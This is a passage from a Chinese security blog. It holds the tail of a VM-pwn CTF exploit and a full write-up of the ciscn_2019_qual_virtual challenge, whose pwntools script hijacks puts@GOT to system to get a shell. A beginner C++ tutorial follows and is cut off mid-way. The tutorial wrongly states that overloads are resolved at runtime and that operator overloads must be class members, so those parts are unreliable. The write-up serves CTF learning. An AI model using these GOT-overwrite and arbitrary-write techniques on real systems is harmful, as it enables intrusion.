class="number">0</span>,<span class="number">0x10</span>)     <span class="comment">#mov reg[2],0x10</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)      <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0xc0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)      <span class="comment">#reg[1]=sal reg[2],8</span></span><br><span class="line"></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0xa0</span>)   <span class="comment">#mov reg[2],0xa0</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>)      <span class="comment">#add reg[1],reg[2]</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>)      <span class="comment">#add reg[4],reg[1]              reg[4][5]---&gt;free_hook address-8</span></span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD39</span>)</span><br><span class="line"><span class="comment">#let pointer comment point to free_hook</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x8</span>)     <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[4]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x7</span>)     <span class="comment">#mov reg[0],9</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[5]</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;R4: &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;R5: &quot;</span>)</span><br><span class="line">addr2=<span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">sys_addr=addr1+((addr2)&lt;&lt;<span class="number">32</span>)-<span class="number">0x381410</span></span><br><span class="line">log_addr(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042056131.png" alt="image-20221204205650878"></p>
<h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2><h3 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052243919.png" alt="image-20221205224348518"></p>
<h3 id="程序逻辑-1"><a href="#程序逻辑-1" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><h4 id="控制堆块与text-data-stack"><a href="#控制堆块与text-data-stack" class="headerlink" title="控制堆块与text data stack"></a>控制堆块与text data stack</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052246509.png" alt="image-20221205224630447"></p>
<p>程序最开始分配了data段，text段和stack段。他们实现的方式都是用一个控制堆块来存放申请出来的这个段的指针，而返回的是控制堆块的地址(以stack段举例，如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052248915.png" alt="image-20221205224802845" style="zoom:50%;" />

<p>malloc先是申请了0x10的内存出来，当做控制堆块，而后申请了8*0x40的内存当做stack，将其地址赋给s，而s这个指针存放到了ptr这个控制堆块里，最后返回ptr。</p>
<h4 id="获取操作码的函数"><a href="#获取操作码的函数" class="headerlink" title="获取操作码的函数"></a>获取操作码的函数</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052250722.png" alt="image-20221205225055604"></p>
<p>这里的实现思路是检测我们输入的字符串中是否出现了指令字符，比如push pop add等等，然后将对应指令换成操作码来存储到text段上(赋值如下)，40144E函数将ptr[i]存放的机器码给到了a1(text段)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052252420.png" alt="image-20221205225251375" style="zoom:67%;" />

<p>上面需要注意的是strtok函数，strtok函数会遍历delim中的每一个字符，如果delim中有任何一个字符在第一个参数中出现，那么就会把这个字符当做分隔符进行分割，使用过strtok函数一次后，之后的每次往下分割只需要让第一个参数为NULL即可。</p>
<h4 id="获取数据的函数"><a href="#获取数据的函数" class="headerlink" title="获取数据的函数"></a>获取数据的函数</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052256437.png" alt="image-20221205225650366"></p>
<p>这个函数是获取用户输入的每个数据，将其存储到data段上，也是以delim分割(这个data段是和text段以及stack段配套使用的)</p>
<h4 id="处理指令函数"><a href="#处理指令函数" class="headerlink" title="处理指令函数"></a>处理指令函数</h4><p>这个execute函数可以对之前输入的每个指令进行处理，需要注意的是下面的puts(s)，因为s可控，并且程序可以被篡改got表，所以之后有机会可以考虑将puts的got表劫持为system的地址，从而在此处获取shell</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052258349.png" alt="image-20221205225833308"></p>
<p>然后下面分析几个典型的函数</p>
<p>下面这个函数是从a1里面获取一个值，存放到a2指向的位置。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052300547.png" alt="image-20221205230047501"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052303350.png" alt="image-20221205230302286"></p>
<p>结合上图来说，(get函数)就是从第一个参数中取一个数据放置到v6中，从而识别出不同指令。</p>
<h5 id="push函数"><a href="#push函数" class="headerlink" title="push函数"></a>push函数</h5><p>接着是push函数，从函数引用这里看出push函数需要一个stack的地址和data地址(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052306158.png" alt="image-20221205230636113"></p>
<p>进入内部的话是依次调用了这两个函数，前者是上面分析过的get函数，将data段里的一个数据取出来给v3，而第二个函数是将v3的值赋值给stack，具体内部实现的过程就不放了，因为我分析的不是十分透彻，<strong>我主要是通过动态调试观察函数执行前和执行后stack data text以及寄存器里的变化得出来每个函数的作用</strong></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052307117.png" alt="image-20221205230703076"></p>
<h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><p>然后是add函数，内部是用了两个get连续从stack里面取两次数据，相加后覆盖了第一个操作数将其放回。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052309678.png" alt="image-20221205230944629"></p>
<h5 id="save函数"><a href="#save函数" class="headerlink" title="save函数"></a>save函数</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052311263.png" alt="image-20221205231132218"></p>
<p>发现就一个参数stack(注意这个stack是控制堆块的地址，而控制堆块里存放的地址才是真正指向stack的)</p>
<p>内部实现如下，先是从stack里取了两个数据，红框里才是最重要的部分，简单分析一下，*(stack+12)是stack中存储元素的个数，再加v2(可控)的值乘以8加上*stack(*stack就是真正stack的地址，而本来的stack是控制堆块的地址)得到最后的地址，save函数就是将v3的值写入最后这个地址里。</p>
<p>很明显v2是可控的，因此可以利用*stack加上一个可控偏移来实现任意数据写入</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052313057.png" alt="image-20221205231309007"></p>
<h5 id="load函数"><a href="#load函数" class="headerlink" title="load函数"></a>load函数</h5><p>load函数与save函数相反，它的漏洞最后可以利用为从任意地址读出数据放入栈中(如下)，同样是因为v2可控，这样可以利用*stack加上可控偏移将任意地址(前提是任意地址和*stack存在固定偏移)中的数据读入到栈中</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052320237.png" alt="image-20221205232048187"></p>
<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>综上所述，我们考虑劫持puts的got表为system地址。先将puts的地址用load读入到stack中再用add函数加上一定的偏移得到system的地址，再利用save函数将system的地址写入到puts的got表。</p>
<p>调试过程如下：</p>
<p>下图为正常情况下stack与其控制堆块的关系，可以很明显的看到控制堆块里存放的是stack的指针，如果我们想去篡改got表，第一件事就是要将这个地址修改成got地址附件的地址。</p>
<blockquote>
<p>能否直接将控制堆块中存放的地址修改为puts的got地址?</p>
<p>不能，如果修改后的话，*(stack+12)就会拿到一个超级大的值被当做索引(而这个超级大的值实际上是函数的真实地址)，需要注意的是控制堆块中的地址决定了stack位于何处，如果更改为puts的got地址后，之后的push操作则会对各个函数的got表进行破坏，并且*(stack+12)也会因为过大导致程序崩溃</p>
</blockquote>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052324075.png" alt="image-20221205232444875"></p>
<p>所以我们得先把stack迁移到got表附近，这里我迁移到了0x4040d0，这里正好位于了got表的下方(如下图)，并且这个地方正好都是内存为0，当做一个新的stack再好不过。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052330226.png" alt="image-20221205233023770" style="zoom:50%;" />

<p>此时新的stack位于got表下方，我们push进来新的索引，让其为负数，这样就能通过新的stack访问到got表中的数据，将其写到新的stack</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052332630.png" alt="image-20221205233223457"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052333469.png" alt="image-20221205233335216"></p>
<p>最后执行一次save函数将system的地址写回puts的got表即可</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25001&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your program name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x4019E2</span>,<span class="number">0x401A75</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your instruction:\n&quot;</span>,<span class="string">&quot;push push save push load push add push save&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your stack data:\n&quot;</span>,<span class="string">&quot;4210896 -3 -21 -172800 -21&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052338726.png" alt="image-20221205233853481"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208450#h2-0">VM Pwn学习-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/117214601">(44条消息) OGeek_2019_Final OVM题解___lifanxin的博客-CSDN博客</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/4320fd7a.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/4320fd7a.html" class="post-title-link" itemprop="url">C++ 常见术语&&基础概念的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:55:03" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>简单入门了一下 C++ ，学习了几天，大概清楚了这些常用的术语和基础概念，虽然这对 <code>PWN</code> 中的 C++ 题目逆向帮助实在不大，但好奇心总是驱使着我尝试弄懂它们。感谢 <code>winmt</code> 师傅在我这部分的学习中，解惑我的一些奇奇怪怪的问题</p>
<h3 id="从输出hello-world开始"><a href="#从输出hello-world开始" class="headerlink" title="从输出hello world开始"></a>从输出hello world开始</h3><p>在 C++ 中可以用如下代码来输出<code>hello world</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>iostream</code> 这个头文件定义了输入输出流的相关类型和函数，这里为什么不是<code>#include&lt;iostream.h&gt;</code> 呢，因为在 C++ 11 标准后，<strong>标准库的头文件</strong>就不再使用 <code>.h</code> 作为后缀了，这样的好处是能够更好的区分标准库的头文件和用户自定义的头文件，比如我们自己写了一个名为 <code>iostream.h</code> 的头文件，就可以使用 <code>#include&lt;iostream.h&gt;</code> 来包含这个头文件，而不会和标准库的 <code>&lt;iostream&gt;</code> 头文件冲突。</p>
<p>此处输出 <code>hello world\n</code> 是 <code> std::cout &lt;&lt; &quot;hello world&quot;</code>这部分来实现的，而后面 <code>\n</code> 则是 <code>&lt;&lt; std ::endl</code>来实现的。 <code>std</code>是标准命名空间，用于区分不同符号名称的机制，在 C++ 标准库中，所有类型和函数都被定义到了标准命名空间（也就是 <code>std</code> ） 补充： 如果在 main函数之前写入 <code>using namespace std</code> 那么之后出现属于 <code>std</code> 中的对象就不必在前面加入 <code>std::</code>了，但通常我们不这么做，尽管这样看起来可能很简洁。</p>
<p>举个例子，全国有很多个张三，为了区分这些张三我们可以给每个张三都加一个前缀，比如河南的张三，北京的张三，这个前缀也就是不同的命名空间了。</p>
<p><u>我们可以使用这个 <code>std::cout</code> <strong>输出流对象</strong>来输出内容</u>，这个输出流对象就是定义在 <code>std</code> 中的。而 <code>&lt;&lt;</code> 是一个流插入运算符，将数据输出到流中。 <code>std::cout &lt;&lt; &quot;hello world&quot; </code> 可以理解为将字符串 <code>”hello world&quot;</code> 流向<code>std::cout</code> 这个输出流，从而进行了输出。 <code>&lt;&lt;</code> 明明是左移运算符，但这里为什么是流插入运算符呢？这是因为运算符重载，姑且可以理解这个重载就是分身，即同一个符号可以在不同情况下有不同的意思</p>
<p>从简单来说，可以把 <code>std::endl</code>看成一个 <code>\n</code> 添加到字符串的末尾，但实际上它的本质是一个函数指针，具体功能是在字符串中增加了一个 <code>\n</code> 并且还调用了flush来刷新缓冲区。那既然是函数指针，怎么调用的时候没有加 <code>()</code> 呢？这是因为这个函数指针被重载运算符 <code>&lt;&lt;</code> 所包装，成为了函数对象，在调用函数对象时不需要再加上圆括号了，因为调用运算符已经被重载了。</p>
<p>下面先来介绍 C++ 中的函数重载，这需要先从一个问题开始思考</p>
<h3 id="std-cout如何识别参数类型"><a href="#std-cout如何识别参数类型" class="headerlink" title="std::cout如何识别参数类型"></a>std::cout如何识别参数类型</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042011540.png" alt="image-20230104201132267" style="zoom:50%;" />

<p>我这里输出了三种类型的数据，分别是 <code>char *</code> <code>int</code> <code>double</code>类型，并且都成功的进行了输出，如果是C语言的话，这里肯定是用 <code>printf</code> 函数中的不同格式化字符来匹配对应的数据，奇怪的是在 C++ 中，看起来一样的输出语句怎么可以匹配不同的参数类型呢？</p>
<p>这就要提到函数重载这个知识点了。</p>
<h4 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h4><p>在 C++ 中，**函数重载允许在同一个作用域中定义多个同名函数，不过它们的参数列表需要不同(**参数类型，数量，或者顺序至少有一项不同)</p>
<p>代码示例如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;This is data of type int&quot;</span> &lt;&lt; std::endl; </span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;This is data of type const char *&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">double</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;This is data of type double&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">type</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="built_in">type</span>(<span class="number">123</span>);</span><br><span class="line">	<span class="built_in">type</span>(<span class="number">0.06</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042053567.png" alt="image-20230104205318468"></p>
<p>可以发现我定义了三个 <code>type</code> 函数，他们的函数名一样，但是参数的类型不一样，而在main函数中调用了三次 <code>type</code> 函数，根据传入的参数不同调用相匹配的那个函数来执行。<strong>实现原理是编译器在编译代码时把所有函数的签名都记录下来，然后在运行时根据函数提供的参数来选择某个函数</strong>。</p>
<h4 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h4><p>但实际上对于 <code>&lt;&lt;</code> 还涉及到了一个重载运算符，简单来说重载运算符指的是我们可以赋予原本运算符新的意义，<strong>重载运算符本质上是</strong>带有特殊名称的<strong>函数</strong>，重载运算符函数(也就是函数名)由关键字 <code>operator</code> 和要重载的运算符构成。</p>
<p>举个例子，我现在创建了一个Box类，然后实例化对象是一个 <code>box</code> ，具有长，宽，高的属性，我现在希望将+重载，使其可以让两个Box对象的每个属性相加。</p>
<p>代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">		<span class="type">int</span> width;</span><br><span class="line">		<span class="type">int</span> height;</span><br><span class="line">		Box <span class="keyword">operator</span>+(<span class="type">const</span> Box&amp; box2)</span><br><span class="line">		&#123;</span><br><span class="line">			Box box3;</span><br><span class="line">			box3.length=<span class="keyword">this</span>-&gt;length + box2.length;</span><br><span class="line">			box3.width=<span class="keyword">this</span>-&gt;width + box2.width;</span><br><span class="line">			box3.height=<span class="keyword">this</span>-&gt;height + box2.height;</span><br><span class="line">			<span class="keyword">return</span> box3;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box box1,box2,box3;</span><br><span class="line">	box1.length=<span class="number">1</span>;</span><br><span class="line">	box1.width=<span class="number">2</span>;</span><br><span class="line">	box1.height=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	box2.length=<span class="number">10</span>;</span><br><span class="line">	box2.width=<span class="number">20</span>;</span><br><span class="line">	box2.height=<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">	box3=box1+box2;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The length of the box3 is &quot;</span> &lt;&lt;box3.length &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The width of the box3 is &quot;</span> &lt;&lt; box3.width &lt;&lt;std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The height of the box3 is &quot;</span> &lt;&lt; box3.height &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042229281.png" alt="image-20230104222911178"></p>
<p>在 <code>Box</code> 这个类中，我们用 <code>operator</code> 指定了重载的运算符为 <code>+</code> ，这二者合成了重载运算符函数，函数名前的依然是函数类型，而后面的括号里装的依然是参数，看起来和正常的函数定义一样。</p>
<p>但需要注意的以下几点</p>
<ol>
<li>重载运算符函数的参数，在上面的例子中， <code>+</code> 两侧的 <code>box1</code> 和<code>box2</code> 是两个参数传入给<code>operator+</code> 这个重载运算符函数，但是实际上定义的地方，你可以看见我写代码中只有一个参数 <code>box2</code> ，实际上第一个对象已经被当做参数进行了传递，该对象的属性需要用 <code>this</code> 运算符进行访问(关于 <code>this</code> 指针，后面会提到)。</li>
<li>观察上面的代码，发现在重载运算符函数的参数中，出现了 <code>const</code> 和 <code>&amp;</code> ，这是因为程序为了保证正确性和效率采取的措施。关于 <code>const</code> ,它是<strong>用来保护函数内部不被意外修改的对象</strong>，例如你重载了加法运算符，那么两个参数都应该是常量，因为它们在函数内部不应该被修改，所以加上 <code>const</code> 也就是说你的函数不会修改类内的任何成员变量，那么就可以将函数声明为 <code>const</code> 类型。关于**<code>&amp;</code> ,它是用来避免拷贝对象的开销的<strong>，提到这里就不得不说</strong>在 C++ 中如果函数的参数是一个对象，那么调用函数时会进行对象的拷贝**，而如果加上 <code>&amp;</code>引用的话，就可以避免拷贝对象造成的开销，提升了程序的效率。但是不加 <code>&amp;</code> 的话，也有一些优点，比如拷贝对象的话，函数内部对对象的修改不会影响原来的对象</li>
<li><strong>重载运算符函数必须是类的成员函数</strong>，也就是你想重载一个运算符，就必须要定义一个类，然后在类的内部定义重载运算符函数。</li>
</ol>
<p>因此根据上面的内容，就可以分析出来std::cout &lt;&lt;实际上是调用了运算符重载函数 <code>cout.operator &lt;&lt; ()</code> ，根据传入的不同参数类型，调用相匹配的重载函数。</p>
<h3 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h3><p>笔记本电脑和台式电脑都属于计算机，计算机有的基本属性，笔记本和台式肯定都有。假设现在有一个任务是要记录计算机的基础配置，并且在之后一段时间还需要记录台式电脑的配置和笔记本电脑的配置，我们可以怎么做，写一个结构体，来记录计算机的配置？然后等到台式就再写一个结构体？如果需要写某个牌子的笔记本电脑的信息就再写N个？(实际上这是个很糟糕的例子,hhh)</p>
<p>不不不，你可能已经猜到我想用什么了，没错，就是用类与对象的概念来实现上述这个问题。</p>
<p>现在抛开之后的任务，只记录计算机的基本信息，并且将其实例化成一个个的对象(你可以将这个实例化的过程理解为将一个抽象的计算机配置突然实例成某个具体品牌的计算机)</p>
<p>举个例子，计算机都具有硬盘，内存，CPU，显卡，IO设备等等。</p>
<p>那么我们可以这么定义一个计算机类，代码如下</p>
<p>此处的各个属性都是我随便写的，理解意思就好，不是真的要介绍各个硬件的信息。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Computer</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> Hard_disk;</span><br><span class="line">		<span class="type">int</span> Memory;</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *CPU;</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *Video_card;</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *IO;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Computer Lenovo;</span><br><span class="line">	Lenovo.Hard_disk=<span class="number">128</span>;</span><br><span class="line">	Lenovo.Memory=<span class="number">8</span>;</span><br><span class="line">	Lenovo.CPU=<span class="string">&quot;xxx-1&quot;</span>;</span><br><span class="line">	Lenovo.Video_card=<span class="string">&quot;ttt-1&quot;</span>;</span><br><span class="line">	Lenovo.IO=<span class="string">&quot;uuu-1&quot;</span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The Hard disk is &quot;</span> &lt;&lt; Lenovo.Hard_disk &lt;&lt; <span class="string">&quot;G&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The Memory is &quot;</span> &lt;&lt; Lenovo.Memory &lt;&lt; <span class="string">&quot;G&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The CPU is &quot;</span> &lt;&lt; Lenovo.CPU &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The Video_card is &quot;</span> &lt;&lt; Lenovo.Video_card &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The IO is &quot;</span> &lt;&lt; Lenovo.IO &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301050013916.png" alt="image-20230105001321846"></p>
<p>上述代码定义了一个 <code>Computer</code> 类，然后实例化的对象为 <code>Lenovo</code> ，对其所有属性都进行了初始化。语法很简单，此处代码主要讲两个点。第一就是实例化后的对象在哪里？第二个就是类中有一个 <code>public</code> ，这个是干啥的？</p>
<h4 id="类实例化后的对象存放到哪里？"><a href="#类实例化后的对象存放到哪里？" class="headerlink" title="类实例化后的对象存放到哪里？"></a>类实例化后的对象存放到哪里？</h4><p>实例化后的对象有两种存储位置，分别是栈和堆。</p>
<p>上面的代码中，因为函数内的局部变量是位于栈上，而 <code>Lenovo</code> 是main函数的局部变量，所以 <code>Lenovo</code> 这个对象位于栈上。</p>
<p>如果主动使用了 <code>new</code> 函数来分配内存给实例化后的对象，那么该对象的内存就会位于堆上，将上面的代码做如下修改，即可让其位于堆上，不再使用该对象的时候需要手动调用 <code>delete</code> 进行销毁，避免内存泄露的问题</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Computer *Lenovo = <span class="keyword">new</span> Computer;</span><br><span class="line">Lenovo-&gt;Hard_disk = <span class="number">128</span>;</span><br><span class="line">Lenovo-&gt;Memory = <span class="number">8</span>;</span><br><span class="line">Lenovo-&gt;CPU = <span class="string">&quot;xxx-1&quot;</span>;</span><br><span class="line">Lenovo-&gt;Video_card = <span class="string">&quot;ttt-1&quot;</span>;</span><br><span class="line">Lenovo-&gt;IO = <span class="string">&quot;uuu-1&quot;</span>;</span><br></pre></td></tr></table></figure>



